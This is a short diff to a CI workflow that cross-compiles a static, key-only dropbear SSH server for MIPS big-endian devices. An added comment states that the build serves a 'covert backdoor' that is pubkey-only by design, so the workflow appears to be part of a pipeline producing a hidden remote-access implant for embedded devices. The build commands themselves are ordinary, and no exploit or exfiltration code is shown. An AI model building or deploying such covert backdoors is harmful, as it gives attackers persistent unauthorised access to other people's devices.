@@ -8,11 +8,14 @@ jobs:
       - name: Install MIPS big-endian cross toolchain
         run: sudo apt-get update && sudo apt-get install -y gcc-mips-linux-gnu wget bzip2 make file
 
-      - name: Build dropbear (static, MIPS big-endian)
+      - name: Build dropbear (static, MIPS big-endian, key-only)
         run: |
           wget -q https://matt.ucc.asn.au/dropbear/releases/dropbear-2022.83.tar.bz2
           tar xjf dropbear-2022.83.tar.bz2
           cd dropbear-2022.83
+          # Key-only server: disable password auth. The cross libc has no crypt(),
+          # and the covert backdoor is pubkey-only by design anyway.
+          printf '#define DROPBEAR_SVR_PASSWORD_AUTH 0\n#define DROPBEAR_SVR_PUBKEY_AUTH 1\n' > localoptions.h
           ./configure --host=mips-linux-gnu CC=mips-linux-gnu-gcc --disable-zlib --disable-syslog
           make PROGRAMS='dropbear dropbearkey' MULTI=1 STATIC=1 -j$(nproc)
           mips-linux-gnu-strip dropbearmulti
